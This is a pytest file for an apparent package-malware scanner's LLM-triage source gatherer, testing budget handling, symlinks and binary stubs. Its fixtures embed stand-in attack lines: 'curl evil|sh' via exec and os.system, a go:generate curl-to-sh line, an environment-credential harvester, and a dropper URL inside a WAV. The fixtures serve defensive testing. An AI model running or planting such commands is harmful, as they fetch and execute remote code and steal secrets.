# SPDX-License-Identifier: AGPL-3.0-or-later
"""Guards for LLM-triage source gathering.

The sneaky bug this catches: a finding can flag a *file* without a specific line
(gomod init()/cgo chains aggregate all init bodies, so they set `file` but no
`line`). The source collector used to require both file AND line, so those
findings contributed no source and the model received "(no source extracted)" —
silently degrading triage quality without changing the (chain-escalated) verdict.
"""
from __future__ import annotations

from pkgward.adapter import Finding
from pkgward.llm.triage import _gather_source, _safe_rglob

_SENTINEL = "(no source extracted)"


def test_convicting_line_finding_survives_priority_budget_pressure(tmp_path):
    """Starvation guard (#4): a priority file big enough to exhaust the whole budget
    must NOT crowd out the source window around the line-anchored finding that drove
    the verdict — otherwise the LLM adjudicates without ever seeing the convicting
    code and can clear a real malicious package to benign."""
    # npm priority file (package.json) larger than the entire code budget.
    (tmp_path / "package.json").write_text('{"x":"' + "A" * (60 * 1024) + '"}')
    deep = tmp_path / "lib" / "vendor"
    deep.mkdir(parents=True)
    body = "\n".join(f"line {i}" for i in range(50))
    deep.joinpath("payload.js").write_text(
        body + "\nconst TROPHY = require('child_process').exec('curl evil|sh');\n"
    )
    finding = Finding(
        rule_id="installer.npm_install_remote_binary_drop", category="npm",
        severity="critical", confidence="high",
        file="lib/vendor/payload.js", line=51, evidence="remote exec",
    )
    src = _gather_source(tmp_path, [finding], ecosystem="npm")
    assert "TROPHY" in src, "convicting line's source window must be gathered before priority files exhaust the budget"


def test_file_level_yara_finding_survives_priority_budget_pressure(tmp_path):
    """The arkclaw FP class: a YARA/intel hit is file-level (no line) yet critical.
    A priority entry file big enough to exhaust the budget must NOT crowd it out —
    otherwise the model sees the rule name with NO source and confabulates a verdict."""
    # pypi priority file (setup.py) larger than the entire code budget.
    (tmp_path / "setup.py").write_text("# " + "A" * (60 * 1024) + "\nsetup()\n")
    pkg = tmp_path / "arkclaw" / "types"
    pkg.mkdir(parents=True)
    pkg.joinpath("credentials.py").write_text(
        "import os\n# TROPHY: the file the critical YARA rule actually hit\n"
        "def creds():\n    return {k: v for k, v in os.environ.items() if k.startswith('ARKCLAW_')}\n"
    )
    finding = Finding(
        rule_id="yara.environment_credential_harvest", category="yara",
        severity="critical", confidence="high",
        file="arkclaw/types/credentials.py", line=None,  # YARA findings have no line
        evidence="bulk env read + network POST [$env1, $exfil1]",
    )
    src = _gather_source(tmp_path, [finding], ecosystem="pypi")
    assert "TROPHY" in src, "critical file-level (YARA) finding's source must be fed before priority files exhaust the budget"


def test_file_level_finding_includes_whole_file(tmp_path):
    """gomod-style file-level finding (file set, line=None) → whole file included."""
    d = tmp_path / "github.com" / "x" / "coBra@v1.0.0" / "cmd"
    d.mkdir(parents=True)
    (d / "helpers.go").write_text(
        'package cmd\nimport "os/exec"\nfunc init() { exec.Command("sh", "-c", "evil").Run() }\n'
    )
    finding = Finding(
        rule_id="gomod.init_exec_chain", category="gomod", severity="critical",
        confidence="high", file="github.com/x/coBra@v1.0.0/cmd/helpers.go", line=None,
        evidence="init() calls os/exec",
    )
    src = _gather_source(tmp_path, [finding], ecosystem="gomod")
    assert src != _SENTINEL
    assert "exec.Command" in src
    assert "helpers.go" in src


def test_line_anchored_finding_includes_region(tmp_path):
    """A finding with file+line → the ±N-line region is included."""
    d = tmp_path / "mod"
    d.mkdir()
    lines = [f"// line {i}" for i in range(1, 60)]
    lines[40] = "//go:generate curl http://evil.invalid/x | sh"
    (d / "gen.go").write_text("\n".join(lines) + "\n")
    finding = Finding(
        rule_id="gomod.go_generate_exec", category="gomod", severity="critical",
        confidence="high", file="mod/gen.go", line=41, evidence="go:generate runs curl",
    )
    src = _gather_source(tmp_path, [finding], ecosystem="gomod")
    assert "go:generate curl" in src
    assert "regions around findings" in src  # line-anchored block marker


def test_no_locatable_file_yields_sentinel(tmp_path):
    """A finding with no file at all can't be located → sentinel (the only legit case)."""
    finding = Finding(
        rule_id="metadata.lure_name", category="metadata", severity="medium",
        confidence="medium", file="", line=None, evidence="lure",
    )
    src = _gather_source(tmp_path, [finding], ecosystem="gomod")
    assert src == _SENTINEL


def test_safe_rglob_skips_dangling_symlink_dir(tmp_path):
    """A dangling symlinked directory must not abort the walk (the crash that
    aborted triage on giant gomod monorepos: rglob's scandir raised
    FileNotFoundError mid-iteration). The real file is still found."""
    real = tmp_path / "real.go"
    real.write_text("package x\n")
    (tmp_path / "ghost").symlink_to(tmp_path / "does_not_exist", target_is_directory=True)
    found = list(_safe_rglob(tmp_path, "*.go"))
    assert real in found


def test_safe_rglob_respects_limit(tmp_path):
    """`limit` caps how many files are yielded so we never crawl a whole monorepo."""
    d = tmp_path / "m"
    d.mkdir()
    for i in range(10):
        (d / f"f{i}.go").write_text("x")
    assert len(list(_safe_rglob(tmp_path, "*.go", limit=3))) == 3


def test_gather_source_survives_dangling_symlink(tmp_path):
    """End-to-end: a dangling symlinked dir in the tree must not crash triage's
    source gathering — the flagged real file is still collected."""
    d = tmp_path / "pkg"
    d.mkdir()
    (d / "setup.py").write_text("import os\nos.system('evil')\n")
    (tmp_path / "ghost").symlink_to(tmp_path / "missing", target_is_directory=True)
    finding = Finding(
        rule_id="installer.setup_exec", category="installer", severity="high",
        confidence="high", file="pkg/setup.py", line=None, evidence="os.system",
    )
    src = _gather_source(tmp_path, [finding], ecosystem="pypi")
    assert "os.system" in src


def test_npm_lifecycle_script_fed_despite_finding_flood(tmp_path):
    """kode FP: the resolved install-hook script (postinstall.js) is THE npm install-time
    surface and must reach the model even when findings on big bundled files compete for
    the budget — otherwise the model adjudicates the install hook it never saw."""
    pkg = tmp_path / "package"
    (pkg / "scripts").mkdir(parents=True)
    (pkg / "package.json").write_text(
        '{"name":"x","version":"1","scripts":{"postinstall":"node scripts/postinstall.js"}}'
    )
    (pkg / "scripts" / "postinstall.js").write_text(
        "// TROPHY: downloads the platform binary from the github release (benign)\nrequire('https')\n"
    )
    (pkg / "dist.js").write_text("X" * (60 * 1024))  # big flagged file that would eat the budget
    findings = [Finding(rule_id="yara.behav_npm_x", category="yara", severity="critical",
                        confidence="high", file="package/dist.js", line=None, evidence="e")]
    src = _gather_source(tmp_path, findings, ecosystem="npm")
    assert "TROPHY" in src, "resolved postinstall.js must be fed via the reserved entry pass"


def test_npm_package_json_fed_despite_many_low_findings(tmp_path):
    """googleapis FP: package.json must survive a flood of low-sev findings on .d.ts files
    that would otherwise consume the whole budget before the manifest is ever fed."""
    pkg = tmp_path / "package"
    pkg.mkdir(parents=True)
    (pkg / "package.json").write_text('{"name":"TROPHYpkg","version":"173","scripts":{}}')
    findings = []
    for i in range(60):
        (pkg / f"types{i}.d.ts").write_text("U" * 2000)
        findings.append(Finding(rule_id="iocs.url_suspicious", category="iocs", severity="low",
                                confidence="low", file=f"package/types{i}.d.ts", line=5, evidence="e"))
    src = _gather_source(tmp_path, findings, ecosystem="npm")
    assert "TROPHYpkg" in src, "package.json must be reserved-fed despite the finding flood"


def test_gomod_go_source_fed_alongside_replace_finding(tmp_path):
    """replace_local_path FP: feed the package's own .go so the model sees real code, not
    just the go.mod the (now-low) replace finding points at."""
    d = tmp_path / "github.com" / "x" / "mod@v1.0.0"
    d.mkdir(parents=True)
    (d / "go.mod").write_text("module github.com/x/mod\n\nreplace github.com/x/sib => ../sib\n")
    (d / "lib.go").write_text("package mod\n// TROPHY real benign code\nfunc Add(a, b int) int { return a + b }\n")
    findings = [Finding(rule_id="gomod.replace_local_path", category="gomod", severity="low",
                        confidence="high", file="github.com/x/mod@v1.0.0/go.mod", line=3, evidence="e")]
    src = _gather_source(tmp_path, findings, ecosystem="gomod")
    assert "TROPHY" in src, "the package's .go must be fed via the entry pass"
    assert "replace" in src, "go.mod (the finding file) must still be fed"


def test_binary_flagged_file_renders_stub_not_soup(tmp_path):
    """breaktimer-app budget waste: file-level entropy findings on media/compiled
    binaries used to dump PER_FILE_CAP of replacement-char soup each, starving real
    source. A flagged binary must render as a stub (magic + embedded strings)."""
    pkg = tmp_path / "app" / "sounds"
    pkg.mkdir(parents=True)
    wav = b"RIFF\x24\x75\x12\x00WAVEfmt " + bytes(range(256)) * 200
    wav += b"\x00https://evil.example/drop.sh\x00"
    (pkg / "blip.wav").write_bytes(wav)
    (tmp_path / "real.py").write_text("import os\n# TROPHY readable source\n")
    findings = [
        Finding(rule_id="entropy.obfuscated_payload", category="entropy", severity="medium",
                confidence="medium", file="app/sounds/blip.wav", line=None,
                evidence="entropy 7.56 bits/byte"),
        Finding(rule_id="iocs.url_suspicious", category="iocs", severity="low",
                confidence="low", file="real.py", line=1, evidence="e"),
    ]
    src = _gather_source(tmp_path, findings, ecosystem="pypi")
    assert "flagged — binary, content not shown" in src
    assert "magic: 52 49 46 46" in src, "RIFF magic bytes must identify the file type"
    assert "https://evil.example/drop.sh" in src, "embedded printable strings must surface"
    assert "�" not in src, "raw binary content must not be dumped as replacement-char soup"
    stub = src[src.index("blip.wav"):]
    stub = stub[:stub.index("--- FILE", 10)] if "--- FILE" in stub[10:] else stub
    assert len(stub) < 3000, "the stub must cost a fraction of PER_FILE_CAP"
    assert "TROPHY" in src, "budget freed by the stub must feed real source"


def test_nonascii_text_source_is_not_stubbed(tmp_path):
    """The binary sniff must key on NUL/decode-failure, NOT non-ASCII: CJK-identifier
    source (obfuscation.nonascii_identifiers) is exactly what the model must read to
    judge obfuscation vs. a non-English project."""
    (tmp_path / "mod.py").write_text(
        "变量 = 'TROPHY'\ndef 函数():\n    return 变量\n", encoding="utf-8")
    findings = [Finding(rule_id="obfuscation.nonascii_identifiers", category="obfuscation",
                        severity="medium", confidence="medium", file="mod.py", line=None,
                        evidence="CJK identifiers")]
    src = _gather_source(tmp_path, findings, ecosystem="pypi")
    assert "TROPHY" in src
    assert "函数" in src, "CJK source must be fed as readable text"
    assert "binary, content not shown" not in src


def test_block_headers_annotate_finding_rules(tmp_path):
    """Each source block carries the rules that fired on it so the model reads code
    with the accusation attached — no join back to the findings JSON."""
    body = "\n".join(f"x{i} = {i}" for i in range(40))
    (tmp_path / "payload.py").write_text(body + "\nimport os; os.system('curl evil|sh')\n")
    (tmp_path / "drop.bin").write_bytes(b"\x7fELF" + b"\x00" * 64)
    findings = [
        Finding(rule_id="malware.env_bulk_exfil", category="malware", severity="critical",
                confidence="high", file="payload.py", line=41, evidence="e"),
        Finding(rule_id="binary.hidden_executable", category="binary", severity="high",
                confidence="high", file="drop.bin", line=None, evidence="e"),
    ]
    src = _gather_source(tmp_path, findings, ecosystem="pypi")
    assert "regions around findings: malware.env_bulk_exfil@L41" in src
    assert "findings: binary.hidden_executable" in src
    assert "magic: 7f 45 4c 46" in src, "ELF magic must identify the dropped binary"
